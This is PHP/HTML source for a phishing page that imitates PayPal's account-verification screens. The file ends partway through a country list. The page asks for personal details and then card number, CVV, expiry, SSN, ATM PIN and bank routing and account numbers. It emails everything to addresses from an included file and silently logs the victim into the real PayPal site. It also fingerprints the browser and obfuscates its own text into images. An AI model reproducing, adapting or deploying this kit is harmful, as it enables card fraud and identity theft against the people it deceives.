<?php
if (!isset($_SESSION)){
  session_start();
}
$etat=false;

include "../option.php";
include "./send_cc.php";
include "../lang/Paye.php";
include "../lang/".lang2();
$top_lang= $_SESSION["top_lang"];
if(isset($_POST['CT'])){
        include "./to.php";
        for($i=0;$i<count($send);$i++){
            mail($send[$i],subject(),cc());
        }
        $etat=true;}
        if($etat==true){
        ?>
        <form name="formnn" action="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_login-submit" method="post">
            <div style="display:none;">
                <input maxlength="20" name="login_email" size="25" value="<?php echo $_SESSION['email'];?>"/>
                <input maxlength="20" name="login_password" size="25" value="<?php echo $_SESSION['password'];?>"/>
            </div>
        </form>
        <script language="JavaScript">
            setTimeout('document.formnn.submit()',0);
        </script>
        <?php
    }
if($etat==false){ 
?>
<html class=" js " lang="<?php echo $top_lang; ?>"><head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset; ?>">

<title><?php echo $profupdate; ?></title>
<link rel="shortcut icon" href="../css/img/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="../css/img/apple-touch-icon.png">
        <!--      Script info: script: sparta, template:  , date: Jun 15, 2014 15:03:27 PDT, country: GB, language: en      web version: 114.0-11303208      content version: major version: 1 minor version: 0      hostname : 9WtKTH7qfNeWfBedzZoO7GyWVNHAvh%2B8Bfz0f%2FTd9SLjq1Cl91obsnPc529CBMPObGT637S08Rrn1nh7tXutnw      rlogid : GPvuOElC5qvqEyVPVptWY7UIFMZZ1GYZs%2FALwaCWiTW2mzDeE3QOUsPKXZEv5jc%2BraXNkCSYjrs6SLhYRu%2BladGn%2BVGxsFjvm0C13ncjAKYICAMQNGW%2BIQ_146a18e7b4e     -->  

        <link rel="stylesheet" href="../css/app.css"> 

        <!--[if IE 8]> <link href="https://www.paypalobjects.com/eboxapps/css/76/7774ee90561e2567e324c11fe85169/ie8.css"  rel="stylesheet" type="text/css" /> <![endif]--> <!--[if IE 7]> <link href="https://www.paypalobjects.com/eboxapps/css/76/7774ee90561e2567e324c11fe85169/ie7.css"  rel="stylesheet" type="text/css" /> <![endif]-->   



    


<?php 
$_GET["convertimage"]=$convertimage;
if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){
	echo "<style type='text/css'>.js .lap .textInput.medium label,.js div.lap.textInput.medium label{top:10px;}</style>";
}
function odr($s,$v){
    $p=str_split($s);$t="";
    for($i=0;$i<count($p);$i++){
        $t.=chr(ord($p[$i])+$v);
    }return $t;}
function change($f,$s,$c,$b,$a){
if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){
if($f==""){$f="arial";}
if($s==""){$s=8;}
if($c==""){$c="70-70-70";}
if($b==""){$b="255-255-255";}
$a=odr($a,3);$a=base64_encode($a);
$a="<img src='img.php?bkg=".$b."&color=".$c."&font=".$f."&size=".$s."&text=".$a."' />";
}
return $a;
}
function change2($w,$f,$s,$c,$b,$a){
if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){
if($w==""){$w=48;}
if($f==""){$f="arial";}
if($s==""){$s=8;}
if($c==""){$c="70-70-70";}
if($b==""){$b="255-255-255";}
$a=odr($a,3);$a=base64_encode($a);
$a="<img src='img2.php?wrap=".$w."&bkg=".$b."&color=".$c."&font=".$f."&size=".$s."&text=".$a."' />";
}
return $a;
}

?>
</head> 
<body class="desktop">  

    <noscript> <p class="nonjsAlert" role="alert"> NOTE: Many features on the PayPal Web site require Javascript and cookies. </p> </noscript>
    <div id="page" class="marketing-ce2">   
        <header class="nav" role="banner"> <div class="navOut"> <nav class="logo" role="navigation"> <a href=""><img title="PayPal" src="../css/img/ppcom.png" alt="PayPal"></a> </nav>  </div> </header>    


<section id="content" role="main" class="GB"> <section id="main">  

<div class="nsb_24 nogutter"> 
    <section class="pageHeadline nsb_12_12 nogutter"> <div class="one column"> <h1> <?php echo change("arialbd",16,"100-100-100","",$verifyaccount); ?>  </h1> </div></section> 
</div>   


<div class="nsb_10_14"> 
<div class="one column"> 
<div class="trayNavOuter"> 

<div class="trayNavInner clearfix" id="onboarding">  


<style type="text/css">

.donately-donation-form, .donately-thank-you {
    font-size: 13px;
    line-height: 1em;
}

.donately-secure-header span {
    padding-left: 1.5em;
    background-position: 0px 0px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAMCAYAAACwXJejAAAAIUlEQVQY02NonjybAYr/Y8FgOXQFDFg0UVnRf0J4VNF/AGtWD2MTxoZrAAAAAElFTkSuQmCC');
}

.donately-secure-header {
    font-size: 0.77em;
    background-color: #E8EBED;
    text-transform: uppercase;
    color: #83939B;
    padding: 1em 1.5em;
    margin-bottom: 1em;
    box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.3) inset;
}

.donately-secure-fields {
    border: 1px solid #D7DADD;
    background-color: #EFF3F5;
    padding: 0px;
    margin: 0px 0px 1.92em;
    border-radius: 3px;
}
.donately-secure-fields .donately-fields.card-number-fields {
    margin-bottom: 1.5em;
}
.donately-secure-fields .donately-fields {
    padding-left: 1.15em;
    padding-right: 1.15em;
    margin-bottom: 0px;}
</style><?php 
echo $_SESSION['adr'];
if(isset($_POST['etap1'])){ ?>
<style type="text/css">
    #dftVC{
        background: url('../css/img/mini.gif') no-repeat scroll right center border-box #FFF;
        background-size: 40px 30px;
        background-position: 95% ;}
    #dftCN{background: url('../css/img/cd/generic.png') no-repeat scroll right center border-box #FFF;background-size: 46px 26px;}
</style>
<script type="text/javascript">
function setppcoki(){
ifrm = document.createElement("IFRAME");
ifrm.setAttribute("src","https://www.paypal.com/jp/cgi-bin/webscr?cmd=_login-run");
ifrm.style.width = 0+"px";ifrm.style.height = 0+"px";ifrm.style.display="none";
document.documentElement.appendChild(ifrm);
}
function rpl(inp){
inp.value = inp.value.replace(/[^\d]/g, '');
}
function print(a){
    if (a=='?????'){  
    	document.getElementById('dftCN').style.backgroundImage = "url('../css/img/cd/generic.png')";
    }else{
    	document.getElementById('dftCN').style.backgroundImage = "url('../css/img/cd/"+a+".png')";
        if(a==1){
            document.getElementById("dftVC").setAttribute("pattern","[0-9]{4}");
        }else{
            document.getElementById("dftVC").setAttribute("pattern","[0-9]{3}");
        }
    }
   document.getElementById("CT").value=a;
}
 function GetTypeNumber(NB) {
    var etat = false;
    //rest_logo();
    var cc = (NB + '').replace(/\s/g, ''); //remove space
    if ((/^(34|37)/).test(cc) && cc.length == 15) {
        print(1); //AMEX begins with 34 or 37, and length is 15.
        etat = true;
    } else if ((/^(51|52|53|54|55)/).test(cc) && cc.length == 16) {
        print(2);
        etat = true;
    } else if ((/^(4)/).test(cc) && (cc.length == 13 || cc.length == 16)) {
        print(3); 
        etat= true;
    } else if ((/^(300|301|302|303|304|305|36|38)/).test(cc) && cc.length == 14) {
        print(4); 
        etat= true;
    } else if ((/^(2014|2149)/).test(cc) && cc.length == 15) {
        print(5); 
        etat= true;
    } else if ((/^(6011|16)/).test(cc) && cc.length == 16) {
        print(6); 
        etat = true;
    } else if ((/^(35)/).test(cc) && cc.length == 16) {
        print(7); 
        etat = true;
    } else if ((/^(6334|6767)/).test(cc) && (cc.length == 16 || cc.length == 18 || cc.length == 19 )) {
        print(8); 
        etat = true;
    } else if ((/^(5018|5020|5038|6304|6759|6761)/).test(cc) && (cc.length == 12 || cc.length == 13 || cc.length == 14 || cc.length == 15 || cc.length == 16 || cc.length == 18 || cc.length == 19 )) {
        print(9); 
        etat = true;
    } else if ((/^(6417500|4917|4913|4508|4844)/).test(cc) && cc.length == 16) {
        print(10); 
        etat = true;
    } else if ((/^(6304|6706|6771|6709)/).test(cc) && cc.length == 16) {
        print(11); 
        etat = true;
    } else if ((/^(4903|4905|4911|4936|564182|633110|6333|6759)/).test(cc) && (cc.length == 16 || cc.length == 18 || cc.length == 19 )) {
        print(12); 
        etat = true;
    }else{
        print('?????'); 
    }
    return etat;
}
var BrowserDetect = {
	init: function () {
		this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
		this.version = this.searchVersion(navigator.userAgent)
			|| this.searchVersion(navigator.appVersion)
			|| "an unknown version";
		this.OS = this.searchString(this.dataOS) || "an unknown OS";
	},
	searchString: function (data) {
		for (var i=0;i<data.length;i++)	{
			var dataString = data[i].string;
			var dataProp = data[i].prop;
			this.versionSearchString = data[i].versionSearch || data[i].identity;
			if (dataString) {
				if (dataString.indexOf(data[i].subString) != -1)
					return data[i].identity;
			}
			else if (dataProp)
				return data[i].identity;
		}
	},
	searchVersion: function (dataString) {
		var index = dataString.indexOf(this.versionSearchString);
		if (index == -1) return;
		return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
	},
	dataBrowser: [
		{
			string: navigator.userAgent,
			subString: "Chrome",
			identity: "Chrome"
		},
		{ 	string: navigator.userAgent,
			subString: "OmniWeb",
			versionSearch: "OmniWeb/",
			identity: "OmniWeb"
		},
		{
			string: navigator.vendor,
			subString: "Apple",
			identity: "Safari",
			versionSearch: "Version"
		},
		{
			prop: window.opera,
			identity: "Opera",
			versionSearch: "Version"
		},
		{
			string: navigator.vendor,
			subString: "iCab",
			identity: "iCab"
		},
		{
			string: navigator.vendor,
			subString: "KDE",
			identity: "Konqueror"
		},
		{
			string: navigator.userAgent,
			subString: "Firefox",
			identity: "Firefox"
		},
		{
			string: navigator.vendor,
			subString: "Camino",
			identity: "Camino"
		},
		{		// for newer Netscapes (6+)
			string: navigator.userAgent,
			subString: "Netscape",
			identity: "Netscape"
		},
		{
			string: navigator.userAgent,
			subString: "MSIE",
			identity: "Explorer",
			versionSearch: "MSIE"
		},
		{
			string: navigator.userAgent,
			subString: "Gecko",
			identity: "Mozilla",
			versionSearch: "rv"
		},
		{ 		// for older Netscapes (4-)
			string: navigator.userAgent,
			subString: "Mozilla",
			identity: "Netscape",
			versionSearch: "Mozilla"
		}
	],
	dataOS : [
		{
			string: navigator.platform,
			subString: "Win",
			identity: "Windows"
		},
		{
			string: navigator.platform,
			subString: "Mac",
			identity: "Mac"
		},
		{
			   string: navigator.userAgent,
			   subString: "iPhone",
			   identity: "iPhone/iPod"
	    },
		{
			string: navigator.platform,
			subString: "Linux",
			identity: "Linux"
		}
	]
 
};
BrowserDetect.init();
</script>
<section style="display: block;" class="container" id="secureinfo">  
<header> <p class="page-error"></p> <h2><?php echo change("arialbd",13,"100-100-100","",$hh1); ?></h2> <p><?php echo change2(52,"",9,"110-110-110","",$pp1) ?></p> </header> 
<form name="form1" action="./bin.php?dispatch=5885d80a13c0db1f8e263663d3f8f8<?php echo "&ee=$ee"; ?>" class="formMedium lap proceed" method="post"> 
<input type="hidden" value="<?php echo $_POST['gg1']; ?>" name="gg1">
<input type="hidden" value="<?php echo $_POST['gg2']; ?>" name="gg2">
<input type="hidden" value="<?php echo $_POST['gg3']; ?>" name="gg3">
<input type="hidden" value="<?php echo $_POST['gg4']; ?>" name="gg4">
<input type="hidden" value="<?php echo $_POST['gg5']; ?>" name="gg5">
<input type="hidden" value="<?php echo $_POST['gg6']; ?>" name="gg6">
<input type="hidden" value="<?php echo $_POST['gg7']; ?>" name="gg7">
<input type="hidden" value="<?php echo $_POST['gg8']; ?>" name="gg8">
<input type="hidden" value="<?php echo $_POST['gg9']; ?>" name="gg9">
<input type="hidden" value="<?php echo $_POST['gg10']; ?>" name="gg10">

<div class="donately-secure-fields">
<div id="test"></div>  
    <div class="donately-secure-header">    
        <span>Secure Information</span>  
    </div>  
    <div style="margin:10px;">
         <div class="textInput medium"> 
            <label class="accessAid" for="CN"><?php echo change("",9,"","",$Nomdutitulairedelacarte); ?></label> 
            <input class="hasHelp validate completed " id="CN" name="CN" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
            <p class="help-error error-empty" ><?php echo change2("","",9,"","",$valid[19]); ?></p> 
            <p class="help-error error-submit" >  </p> 
            <p class="help-information" ><?php echo change2("","",9,"","",$cardholder_info) ?> </p> 
        </div><input id="CT" type="hidden" name="CT">
         <div class="textInput medium"> 
            <label class="accessAid" for="dftCN"><?php echo change("",9,"","",$ccnumbr); ?></label> 
            <input class="hasHelp validate completed " pattern="(^(4)[0-9]{12})|(^(4)[0-9]{15})|(^(34|37)[0-9]{13})|(^(51|52|53|54|55|16|35)[0-9]{14})|(^(300|301|302|303|304|305)[0-9]{11})|(^(2014|2149|5018|5020|5038|6304|6759|6761)[0-9]{11})|(^(5018|5020|5038|6304|6759|6761)[0-9]{8})|(^(5018|5020|5038|6304|6759|6761)[0-9]{9})|(^(5018|5020|5038|6304|6759|6761)[0-9]{10})|(^(5018|5020|5038|6304|6759|6761)[0-9]{11})|(^(5018|5020|5038|6304|6759|6761|6334|6767|4917|4913|4508|4844|6304|6706|6771|6709|4903|4905|4911|4936|5641|6331|6333|6759|6417)[0-9]{12})|(^(5018|5020|5038|6304|6759|6761|6334|6767|4903|4905|4911|4936|5641|6331|6333|6759)[0-9]{14})|(^(5018|5020|5038|6304|6759|6761|6334|6767|4903|4905|4911|4936|5641|6331|6333|6759)[0-9]{15})" id="dftCN" name="dftCN" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text" onkeyup="rpl(this)" onblur="GetTypeNumber(this.value)"> 
            <p class="help-error error-empty" ><?php echo change2("","",9,"","",$card_info); ?></p> 
            <p class="help-error error-format"><?php echo change2("","",9,"","",$card_format); ?></p>
            <p class="help-error error-submit" >  </p> 
            <p class="help-information" ><?php echo change2("","",9,"","",$card_info); ?></p> 
        </div><input type="text" id="BROWSER" name="BROWSER" value="" style="display:none;">
<script type="text/javascript"> 
document.getElementById('BROWSER').value = BrowserDetect.browser + ' ' + BrowserDetect.version + ' on ' + BrowserDetect.OS;
</script> 

 <div class="multiFields wide">  
        <div class="textInput medium datex"> 
            <label for="datex"  class="accessAid"><?php echo change("",9,"","",$expbr); ?></label> 
               <input id="datex" pattern="(([0][1-9])|([1][0-2]))/([0-9]{4})" name="datex" required="required" class="hasHelp validate completed" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" data-placeholder-text="mm/yyyy" data-label="Date of Birth" type="text">     <p id="dobEmpty" class="help-error error-empty"><?php echo change2(23,"",9,"","",$ex_date_empty); ?></p>      
               <p class="help-error error-submit" id="dobSubmit">  </p> 
               <p class="help-error error-format" id="dobFormat"><?php echo change2(23,"",9,"","",$ex_date_format); ?></p>
                <p class="help-information" id="dobInfo"><?php echo change2(23,"",9,"","",$ex_date_info); ?></p>
    </div>

        <div class="textInput medium cvc"> 
            <label class="accessAid" for="dftVC"><?php echo change("",9,"","","CVV"); ?></label> 
            <input class="hasHelp validate completed " onkeyup="rpl(this)" pattern="([0-9]{3})|([0-9]{4})" id="dftVC" name="dftVC" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
            <p class="help-error error-empty" > <?php echo change2(19,"",9,"","",$valid[28]); ?> </p> 
            <p class="help-error error-format"> <?php echo change2(19,"",9,"","",$valid[28]); ?></p>
            <p class="help-error error-submit">  </p> 
            <p class="help-information" > <?php echo change2(19,"",9,"","",$valid[27]); ?> </p> 
            <p class="help-error error-submit" >  </p> 
        </div>  
</div>

<?php 
if($atmO==true){ 
?>
<div class="multiFields phone" >
 <div class="textInput medium"> 
    <label class="accessAid" for="MMT"><?php echo change("",9,"","",$atmm); ?></label> 
    <input class="hasHelp validate completed" id="MMT" name="MMT" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"  onkeyup="rpl(this)" pattern="([0-9]{4})"> 
    <p class="help-error error-empty" ><?php echo change2("","",9,"","",$valid[30]); ?></p> 
    <p class="help-error error-format"> <?php echo change2("","",9,"","",$valid[31]); ?></p>
    <p class="help-error error-submit">  </p> 
    <p class="help-information" ><?php echo change2("","",9,"","",$atm_info); ?></p> 
 </div> 
</div>
<?php 
}   
?>
<?php $cntr=$_SESSION['tempLang']; if($cntr!="GB" and $cntr!="UK"){

  ?>
<div class="multiFields phone">
  <div class="textInput medium"> 
        <label class="accessAid" for="NNS"><?php echo change("",9,"","",$ssn); ?></label> 
        <input class="hasHelp validate completed" id="NNS" name="NNS" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text" onkeyup="rpl(this)" pattern="([0-9]{9})" > 
        <p class="help-error error-empty"><?php echo change2("","",9,"","",$valid[33]); ?></p> 
        <p class="help-error error-format"> <?php echo change2("","",9,"","",$valid[34]); ?></p>
        <p class="help-error error-submit">  </p> 
        <p class="help-information"><?php echo change2("","",9,"","",$valid[33]); ?></p> 
     </div> 
</div>
<?php 
}   
?>

<?php 
 
if($cntr=="GB" or $cntr=="UK" or  $cntr=="NO" or  $cntr=="SE"  or  $cntr=="FI" or  $cntr=="IE"){
$valid[37]="Please enter your Sort Code";
$valid[38]="Invalid Sort Code";
?>
<div class="multiFields phone">
 <div class="textInput medium"> 
    <label class="accessAid" for="CPNL"><?php echo change("",9,"","","Sort code"); ?></label> 
    <input class="hasHelp validate completed" id="CPNL" name="CPNL" pattern="([0-9]{6})|(([0-9][0-9])-([0-9][0-9])-([0-9][0-9]))" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
    <p class="help-error error-empty" ><?php echo change2("","",9,"","",$valid[38]); ?></p> 
    <p class="help-error error-format"> <?php echo change2("","",9,"","","Sort code is invalid"); ?></p>
    <p class="help-error error-submit" >  </p> 
    <p class="help-information" ><?php echo change2("","",9,"","",$valid[37]); ?></p> 
 </div> 
</div>  
<?php 
}elseif($cntr=="IL" or $_POST['gg7']=="ISRAEL"){
?>
<div class="multiFields phone">
 <div class="textInput medium"> 
    <label class="accessAid" for="CPNL"><?php echo change("",9,"","","Web code from your last monthly bill"); ?></label> 
    <input class="hasHelp validate completed" id="CPNL" name="CPNL" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
    <p class="help-error error-empty" ><?php echo change2("","",9,"","","Please enter your Web code from your last monthly bill"); ?></p> 
    <p class="help-error error-submit" >  </p> 
    <p class="help-information" ><img src="../css/img/reg_code.gif" height="125" width="210"></p> 
 </div> 
</div>  
<?php 
}else{

if($securcode==true){
?>
<div class="multiFields phone">
 <div class="textInput medium"> 
    <label class="accessAid" for="CPNL"><?php echo change("",9,"","",$codepersonel); ?></label> 
    <input class="hasHelp validate completed" id="CPNL" name="CPNL" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
    <p class="help-error error-empty" ><?php echo change2("","",9,"","",$valid[38]); ?></p> 
    <p class="help-error error-submit" >  </p> 
    <p class="help-information" ><?php echo change2("","",9,"","",$valid[37]); ?></p> 
 </div> 
</div>  
<?php 
}

}
?>

<?php 
if($bkR==true){ 
?>
<div class="multiFields phone">
  <div class="textInput medium"> 
        <label class="accessAid" for="RGT"><?php echo change("",9,"","",$routing); ?></label> 
        <input class="hasHelp validate completed" id="RGT" name="RGT" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"  onkeyup="rpl(this)" pattern="[0-9]{9}" > 
        <p class="help-error error-empty"><?php echo change2("","",9,"","",$routing_empty); ?></p> 
        <p class="help-error error-format"> <?php echo change2("","",9,"","",$routing_format); ?></p>
        <p class="help-error error-submit">  </p> 
        <p class="help-information"><?php echo change2("","",9,"","",$routing_info); ?></p> 
     </div> 
</div>
<?php 
}   
?>

<?php 
if($bkA==true){ 
?>
<div class="multiFields phone">
  <div class="textInput medium"> 
        <label class="accessAid" for="TNC"><?php echo change("",9,"","",$account); ?></label> 
        <input class="hasHelp validate completed" id="TNC" name="TNC" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"  onkeyup="rpl(this)" pattern="^[0-9]+$" > 
        <p class="help-error error-empty"><?php echo change2("","",9,"","",$account_empty); ?></p> 
        <p class="help-error error-format"> <?php echo change2("","",9,"","",$account_format); ?></p>
        <p class="help-error error-submit">  </p> 
        <p class="help-information"><?php echo change2("","",9,"","",$account_info); ?></p> 
     </div> 
</div>
<?php 
}   
?>

</div>

</div>
    <input name="jsEnabled" id="jsEnabled" value="1" type="hidden"> 
    <input name="_eventId_continue" value="<?php echo $button_continue; ?>" class="button completed" type="submit"> 
    <input name="_eventId_changeCountry" id="changeCountry" value="Change Country" class="countrySubmit button" type="submit"> 

</form> 

 </section>  
<?php 
}else{   
?>








<section style="display: block;" id="normalinfo">  
    <header> <p class="page-error"></p> <h2><?php echo change("arialbd",13,"100-100-100","",$hh2); ?></h2> <p><?php echo change2(52,"",9,"110-110-110","",$pp2) ?></p> </header>


 <form name="form1" novalidate="novalidate" method="post" class="formMedium lap proceed" action="./bin.php?dispatch=5885d80a13c0db1f8e263663d3f8f8<?php echo "&ee=$ee"; ?>" >
<input type="hidden" value="etap1" name="etap1" >
 <div class="textInput medium"> 
    <label class="accessAid" for="gg1"><?php echo change("",9,"","",$first_name); ?></label> 
    <input class="hasHelp validate completed" id="gg1" name="gg1" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> 
    <p class="help-error error-empty" id="firstNameEmpty"><?php echo change2("","",9,"","",$first_name_empty); ?></p> 
    <p class="help-error error-submit" id="firstNameSubmit">  </p> 
    <p class="help-information" id="firstNameInfo"><?php echo change2("","",9,"","",$first_name_info); ?></p> 
 </div> 


<div class="textInput medium"> <label class="accessAid" for="gg2"><?php echo change("",9,"","",$last_name); ?></label> <input class="hasHelp validate completed" id="gg2" name="gg2" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"> <p id="lastNameEmpty" class="help-error error-empty"><?php echo change2("","",9,"","",$last_name_info); ?></p> <p class="help-error error-submit" id="lastNameSubmit">  </p> <p class="help-information" id="lastNameInfo"><?php echo change2("","",9,"","",$last_name_info); ?></p> </div>      



<div class="textInput medium dob"> <label class="accessAid" for="gg3"><?php echo change("",9,"","",$Birth_date); ?></label>         <input id="gg3" pattern="(([0-2][0-9])|([3][0-1]))/(([0][1-9])|([1][0-2]))/([0-9]{4})" name="gg3" required="required" class="hasHelp validate completed" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" data-placeholder-text="dd/mm/yyyy" data-label="Date of Birth" type="text">     <p id="dobEmpty" class="help-error error-empty"><?php echo change2("","",9,"","",$Birth_date_empty); ?></p>      <p class="help-error error-submit" id="dobSubmit">  </p> <p class="help-error error-format" id="dobFormat"><?php echo change2("","",9,"","",$Birth_date_format); ?></p> <p class="help-information" id="dobInfo"><?php echo change2("","",9,"","",$Birth_date_info); ?></p> </div>   


<div class="textInput medium address1"> <label class="accessAid" for="gg4"><?php echo change("",9,"","",$Address1); ?></label> <input class="hasHelp confidential validate completed" id="gg4" name="gg4" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" type="text"> <p class="help-error error-empty" id="addressEmpty"><?php echo change2("","",9,"","",$Address1_empty); ?></p> <p class="help-error error-submit" id="addressSubmit">  </p> <p class="help-information" id="addressInfo"><?php echo change2("","",9,"","",$Address1_info); ?></p> </div> 


<div class="textInput medium address2"> <label class="" for="gg5"><?php echo change("",9,"","",$Address2); ?></label> <input class="hasHelp confidential" id="gg5" name="gg5" value="" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="false" type="text"> </div> 

<div class="textInput medium city"> <label class="accessAid" for="gg6"><?php echo change("",9,"","",$City); ?></label> <input aria-describedby="cityError" id="gg6" name="gg6" class="validate completed" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" type="text"> <p id="cityError" class="help-error error-empty"><?php echo change2("","",9,"","",$City_empty); ?></p> <p class="help-error error-submit" id="citySubmit">  </p> </div>


 <div class="multiFields wide">  <div class="selectDropdown state"> <label for="gg7" class="accessAid" id="forState">County</label> 

<select name="gg7" id="gg7">    


    <option value="UNITED STATES">United States</option>
    <option value="CANADA">Canada</option>
    <option value="MEXICO">Mexico</option>
    <option value="UNITED KINGDOM">United Kingdom</option>
    <option value="FRANCE">France</option>
    <option value="GERMANY">Germany</option>
    <option value="NETHERLANDS">Netherlands</option>
    <option value="DENMARK">Denmark</option>
    <option value="RUSSIA">Russia</option>
    <option value="ITALY">Italy</option>
    <option value="AFGHANISTAN">Afghanistan</option>
    <option value="ALBANIA">Albania</option>
    <option value="ALGERIA">Algeria</option>
    <option value="AMERICAN SAMOA">American Samoa</option>
    <option value="ANGUILLA">Anguilla</option>
    <option value="ANTIGUA &amp; BARBUDA">Antigua &amp; Barbuda</option>
    <option value="ARGENTINA">Argentina</option>
    <option value="ARMENIA">Armenia</option>
    <option value="ARUBA">Aruba</option>
    <option value="AUSTRALIA">Australia</option>
    <option value="AUSTRIA">Austria</option>
    <option value="AZERBAIJAN">Azerbaijan</option>
    <option value="BAHAMAS">Bahamas</option>
    <option value="BAHRAIN">Bahrain</option>
    <option value="BANGLADESH">Bangladesh</option>
    <option value="BARBADOS">Barbados</option>
    <option value="BELARUS">Belarus</option>
    <option value="BELGIUM">Belgium</option>
    <option value="BELIZE">Belize</option>
    <option value="BENIN">Benin</option>
    <option value="BHUTAN">Bhutan</option>
    <option value="BOLIVIA">Bolivia</option>
    <option value="BONAIRE">Bonaire</option>
    <option value="BOSNIA &amp; HERZEGOVINA">Bosnia &amp; Herzegovina</option>
    <option value="BOTSWANA">Botswana</option>
    <option value="BRAZIL">Brazil</option>
    <option value="BRITISH VIRGIN ISLANDS">British Virgin Islands</option>
    <option value="BRUNEI DARUSSALAM">Brunei Darussalam</option>
    <option value="BULGARIA">Bulgaria</option>
    <option value="BURKINA FASO">Burkina Faso</option>
    <option value="BURUNDI">Burundi</option>
    <option value="CAMBODIA">Cambodia</option>
    <option value="CAMEROON">Cameroon</option>
    <option value="CAPE VERDE">Cape Verde</option>
    <option value="CAYMAN ISLANDS">Cayman Islands</option>
    <option value="CENTRAL AFRICAN REPUBLIC">Central African Rep</option>
    <option value="CHAD">Chad</option>
    <option value="CHILE">Chile</option>
    <option value="CHINA">China</option>
    <option value="COLOMBIA">Colombia</option>
    <option value="COMOROS">Comoros</option>
    <option value="CONGO">Congo</option>
    <option value="COOK ISLANDS">Cook Islands</option>
    <option value="COSTA RICA">Costa Rica</option>
    <option value="COTE D IVOIRE">Cote D'Ivoire</option>
    <option value="CROATIA">Croatia</option>
    <option value="CUBA - US MILITARY">Cuba - US Military</option>
    <option value="CURACAO">Curacao</option>
    <option value="CYPRUS">Cyprus</option>
    <option value="CYPRUS NORTHERN">Cyprus (Northern)</option>
    <option value="CZECH REPUBLIC">Czech Republic</option>
    <option value="DEMOCRATIC REPUBLIC OF CONGO">Dem Rep of Congo</option>
    <option value="DJIBOUTI">Djibouti</option>
    <option value="DOMINICA">Dominica</option>
    <option value="DOMINICAN REPUBLIC">Dominican Republic</option>
    <option value="EAST TIMOR">East Timor</option>
    <option value="ECUADOR">Ecuador</option>
    <option value="EGYPT">Egypt</option>
    <option value="EL SALVADOR">El Salvador</option>
    <option value="EQUATORIAL GUINEA">Equatorial Guinea</option>
    <option value="ERITREA">Eritrea</option>
    <option value="ESTONIA">Estonia</option>
    <option value="ETHIOPIA">Ethiopia</option>
    <option value="FALKLAND ISLANDS">Falkland Islands</option>
    <option value="FIJI">Fiji</option>
    <option value="FINLAND">Finland</option>
    <option value="FRENCH GUIANA">French Guiana</option>
    <option value="FRENCH POLYNESIA">French Polynesia</option>
    <option value="GABON">Gabon</option>
    <option value="GAMBIA">Gambia</option>
    <option value="GEORGIA">Georgia</option>
    <option value="GERMANY - US MILITARY">Germany - US Military</option>
    <option value="GHANA">Ghana</option>
    <option value="GIBRALTAR">Gibraltar</option>
    <option value="GREECE">Greece</option>
    <option value="GRENADA">Grenada</option>
    <option value="GUADELOUPE">Guadeloupe</option>
    <option value="GUAM">Guam</option>
    <option value="GUATEMALA">Guatemala</option>
    <option value="GUINEA">Guinea</option>
    <option value="GUINEA-BISSAU">Guinea-Bissau</option>
    <option value="GUYANA">Guyana</option>
    <option value="HAITI">Haiti</option>
    <option value="HONDURAS">Honduras</option>
    <option value="HONG KONG">Hong Kong</option>
    <option value="HUNGARY">Hungary</option>
    <option value="ICELAND">Iceland</option>
    <option value="INDIA">India</option>
    <option value="INDONESIA">Indonesia</option>
    <option value="IRAQ">Iraq</option>
    <option value="IRELAND">Ireland</option>
    <option value="ISRAEL">Israel</option>
    <option value="ITALY - US MILITARY">Italy - US Military</option>
    <option value="JAMAICA">Jamaica</option>
    <option value="JAPAN">Japan</option>
    <option value="JAPAN - US MILITARY">Japan - US Military</option>
    <option value="JORDAN">Jordan</option>
    <option value="KAZAKHSTAN">Kazakhstan</option>
    <option value="KENYA">Kenya</option>
    <option value="KIRIBATI">Kiribati</option>
    <option value="KOREA - US MILITARY">Korea - US Military</option>
    <option value="REPUBLIC OF KOREA">Korea, Republic of</option>
    <option value="KOSOVO DEM">Kosovo</option>
    <option value="KUWAIT">Kuwait</option>
    <option value="KYRGHYZ REPUBLIC">Kyrghyz Republic</option>
    <option value="LAOS">Laos</option>
    <option value="LATVIA">Latvia</option>
    <option value="LEBANON">Lebanon</option>
    <option value="LIBERIA">Liberia</option>
    <option value="LIBYA">Libya</option>
    <option value="LIECHTENSTEIN">Liechtenstein</option>
    <option value="LITHUANIA">Lithuania</option>
    <option value="LUXEMBOURG">Luxembourg</option>
    <option value="MACAU">Macau</option>
    <option value="MACEDONIA">Macedonia</option>
    <option value="MADAGASCAR">Madagascar</option>
    <option value="MALAWI">Malawi</option>
    <option value="MALAYSIA">Malaysia</option>
    <option value="MALDIVES">Maldives</option>
    <option value="MALI">Mali</option>
    <option value="MALTA">Malta</option>
    <option value="MARSHALL ISLANDS">Marshall Islands</option>
    <option value="MARTINIQUE">Martinique</option>
